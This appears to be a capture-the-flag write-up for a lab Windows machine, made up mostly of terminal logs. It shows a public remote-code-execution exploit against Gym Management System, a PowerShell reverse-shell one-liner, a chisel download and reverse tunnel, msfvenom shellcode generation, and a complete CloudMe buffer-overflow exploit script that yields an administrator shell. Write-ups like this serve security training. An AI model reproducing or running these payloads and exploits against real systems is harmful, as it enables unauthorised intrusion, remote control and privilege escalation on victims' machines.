@@ -1,0 +1,217 @@
+
+
+contact page tells us
+ Made using Gym Management Software 1.0 
+
+ 
+Gym Management System 1.0 - Unauthenticated Remote Code Execution
+https://www.exploit-db.com/exploits/48506
+
+┌──(root㉿kali)-[/home/kali]
+└─# python2 exploit_48506.py http://10.10.10.198:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload> 
+
+
+
+
+
+C:\xampp\htdocs\gym\upload> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.16', 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (IEX $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.198] 49756
+
+user flag found
+
+PS C:\Users\shaun\Downloads> dir
+
+
+    Directory: C:\Users\shaun\Downloads
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      
+
+
+"The CloudMe service, which the
+CloudMe_1112.exe application is a part of, 
+listens for connections on TCP port 8888"
+
+
+PS C:\Users\shaun\Downloads> netstat -an
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
+  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING
+  TCP    10.10.10.198:8080      10.10.14.16:39596      ESTABLISHED
+  TCP    10.10.10.198:49756     10.10.14.16:4444       ESTABLISHED
+  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
+  TCP    [::]:135               [::]:0                 LISTENING
+  TCP    [::]:445               [::]:0                 LISTENING
+  TCP    [::]:7680              [::]:0                 LISTENING
+  TCP    [::]:8080              [::]:0                 LISTENING
+  TCP    [::]:49664             [::]:0                 LISTENING
+  TCP    [::]:49665             [::]:0                 LISTENING
+  TCP    [::]:49666             [::]:0                 LISTENING
+  TCP    [::]:49667             [::]:0                 LISTENING
+  TCP    [::]:49668             [::]:0                 LISTENING
+  TCP    [::]:49669             [::]:0                 LISTENING
+
+
+
+
+PS C:\Users\shaun\Downloads> wget http://10.10.14.16:8000/chisel_windows.exe -o chisel.exe
+PS C:\Users\shaun\Downloads> ./chisel.exe client 10.10.14.16:443 R:8888:127.0.0.1:8888
+
+┌──(root㉿kali)-[/home/kali]
+└─# sudo pkill chisel
+sudo chisel server -p 443 --reverse 
+2025/08/25 09:00:11 server: Reverse tunnelling enabled
+2025/08/25 09:00:11 server: Fingerprint cr82ZOf4a8QI3UkdyVM97Vl+zgIzuQnGAqueV6Fi0+4=
+2025/08/25 09:00:11 server: Listening on http://0.0.0.0:443
+2025/08/25 09:00:23 server: session#1: Client version (1.7.3) differs from server version (1.10.1-0kali1)
+2025/08/25 09:00:23 server: session#1: tun: proxy#R:8888=>8888: Listening
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=2222 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1745 bytes
+buf =  b""
+buf += b"\xb8\x54\xdb\xaf\xa0\xdb\xcc\xd9\x74\x24\xf4\x5d"
+buf += b"\x31\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\x11"
+buf += b"\xd5\x4d\x55\x65\x01\x13\x96\x95\xd2\x74\x1e\x70"
+buf += b"\xe3\xb4\x44\xf1\x54\x05\x0e\x57\x59\xee\x42\x43"
+buf += b"\xea\x82\x4a\x64\x5b\x28\xad\x4b\x5c\x01\x8d\xca"
+buf += b"\xde\x58\xc2\x2c\xde\x92\x17\x2d\x27\xce\xda\x7f"
+buf += b"\xf0\x84\x49\x6f\x75\xd0\x51\x04\xc5\xf4\xd1\xf9"
+buf += b"\x9e\xf7\xf0\xac\x95\xa1\xd2\x4f\x79\xda\x5a\x57"
+buf += b"\x9e\xe7\x15\xec\x54\x93\xa7\x24\xa5\x5c\x0b\x09"
+buf += b"\x09\xaf\x55\x4e\xae\x50\x20\xa6\xcc\xed\x33\x7d"
+buf += b"\xae\x29\xb1\x65\x08\xb9\x61\x41\xa8\x6e\xf7\x02"
+buf += b"\xa6\xdb\x73\x4c\xab\xda\x50\xe7\xd7\x57\x57\x27"
+buf += b"\x5e\x23\x7c\xe3\x3a\xf7\x1d\xb2\xe6\x56\x21\xa4"
+buf += b"\x48\x06\x87\xaf\x65\x53\xba\xf2\xe1\x90\xf7\x0c"
+buf += b"\xf2\xbe\x80\x7f\xc0\x61\x3b\x17\x68\xe9\xe5\xe0"
+buf += b"\x8f\xc0\x52\x7e\x6e\xeb\xa2\x57\xb5\xbf\xf2\xcf"
+buf += b"\x1c\xc0\x98\x0f\xa0\x15\x0e\x5f\x0e\xc6\xef\x0f"
+buf += b"\xee\xb6\x87\x45\xe1\xe9\xb8\x66\x2b\x82\x53\x9d"
+buf += b"\xbc\xa7\xa9\x93\x2c\xd0\xaf\xab\x44\x8e\x39\x4d"
+buf += b"\x3e\xde\x6f\xc6\xd7\x47\x2a\x9c\x46\x87\xe0\xd9"
+buf += b"\x49\x03\x07\x1e\x07\xe4\x62\x0c\xf0\x04\x39\x6e"
+buf += b"\x57\x1a\x97\x06\x3b\x89\x7c\xd6\x32\xb2\x2a\x81"
+buf += b"\x13\x04\x23\x47\x8e\x3f\x9d\x75\x53\xd9\xe6\x3d"
+buf += b"\x88\x1a\xe8\xbc\x5d\x26\xce\xae\x9b\xa7\x4a\x9a"
+buf += b"\x73\xfe\x04\x74\x32\xa8\xe6\x2e\xec\x07\xa1\xa6"
+buf += b"\x69\x64\x72\xb0\x75\xa1\x04\x5c\xc7\x1c\x51\x63"
+buf += b"\xe8\xc8\x55\x1c\x14\x69\x99\xf7\x9c\x89\x78\xdd"
+buf += b"\xe8\x21\x25\xb4\x50\x2c\xd6\x63\x96\x49\x55\x81"
+buf += b"\x67\xae\x45\xe0\x62\xea\xc1\x19\x1f\x63\xa4\x1d"
+buf += b"\x8c\x84\xed"
+                            
+We insert this into the PoC
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat exploit_48389.py                       
+import socket
+
+target = "127.0.0.1"
+
+padding1   = b"\x90" * 1052
+EIP        = b"\xB5\x42\xA8\x68"
+NOPS       = b"\x90" * 30
+
+payload = b""
+payload += b"\xb8\x54\xdb\xaf\xa0\xdb\xcc\xd9\x74\x24\xf4\x5d"
+payload += b"\x31\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\x11"
+payload += b"\xd5\x4d\x55\x65\x01\x13\x96\x95\xd2\x74\x1e\x70"
+payload += b"\xe3\xb4\x44\xf1\x54\x05\x0e\x57\x59\xee\x42\x43"
+payload += b"\xea\x82\x4a\x64\x5b\x28\xad\x4b\x5c\x01\x8d\xca"
+payload += b"\xde\x58\xc2\x2c\xde\x92\x17\x2d\x27\xce\xda\x7f"
+payload += b"\xf0\x84\x49\x6f\x75\xd0\x51\x04\xc5\xf4\xd1\xf9"
+payload += b"\x9e\xf7\xf0\xac\x95\xa1\xd2\x4f\x79\xda\x5a\x57"
+payload += b"\x9e\xe7\x15\xec\x54\x93\xa7\x24\xa5\x5c\x0b\x09"
+payload += b"\x09\xaf\x55\x4e\xae\x50\x20\xa6\xcc\xed\x33\x7d"
+payload += b"\xae\x29\xb1\x65\x08\xb9\x61\x41\xa8\x6e\xf7\x02"
+payload += b"\xa6\xdb\x73\x4c\xab\xda\x50\xe7\xd7\x57\x57\x27"
+payload += b"\x5e\x23\x7c\xe3\x3a\xf7\x1d\xb2\xe6\x56\x21\xa4"
+payload += b"\x48\x06\x87\xaf\x65\x53\xba\xf2\xe1\x90\xf7\x0c"
+payload += b"\xf2\xbe\x80\x7f\xc0\x61\x3b\x17\x68\xe9\xe5\xe0"
+payload += b"\x8f\xc0\x52\x7e\x6e\xeb\xa2\x57\xb5\xbf\xf2\xcf"
+payload += b"\x1c\xc0\x98\x0f\xa0\x15\x0e\x5f\x0e\xc6\xef\x0f"
+payload += b"\xee\xb6\x87\x45\xe1\xe9\xb8\x66\x2b\x82\x53\x9d"
+payload += b"\xbc\xa7\xa9\x93\x2c\xd0\xaf\xab\x44\x8e\x39\x4d"
+payload += b"\x3e\xde\x6f\xc6\xd7\x47\x2a\x9c\x46\x87\xe0\xd9"
+payload += b"\x49\x03\x07\x1e\x07\xe4\x62\x0c\xf0\x04\x39\x6e"
+payload += b"\x57\x1a\x97\x06\x3b\x89\x7c\xd6\x32\xb2\x2a\x81"
+payload += b"\x13\x04\x23\x47\x8e\x3f\x9d\x75\x53\xd9\xe6\x3d"
+payload += b"\x88\x1a\xe8\xbc\x5d\x26\xce\xae\x9b\xa7\x4a\x9a"
+payload += b"\x73\xfe\x04\x74\x32\xa8\xe6\x2e\xec\x07\xa1\xa6"
+payload += b"\x69\x64\x72\xb0\x75\xa1\x04\x5c\xc7\x1c\x51\x63"
+payload += b"\xe8\xc8\x55\x1c\x14\x69\x99\xf7\x9c\x89\x78\xdd"
+payload += b"\xe8\x21\x25\xb4\x50\x2c\xd6\x63\x96\x49\x55\x81"
+payload += b"\x67\xae\x45\xe0\x62\xea\xc1\x19\x1f\x63\xa4\x1d"
+payload += b"\x8c\x84\xed"
+
+overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
+
+buf = padding1 + EIP + NOPS + payload + overrun
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target, 8888))
+    s.send(buf)
+    s.close()
+except Exception as e:
+    print(e)
+
+
+with the tunnel open, we can run the script and 
+get a call to our shell as administrator
+
+┌──(root㉿kali)-[/home/kali]
+└─# python2 exploit_48389.py
+                                 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 2222
+listening on [any] 2222 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.198] 49763
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+buff\administrator
+
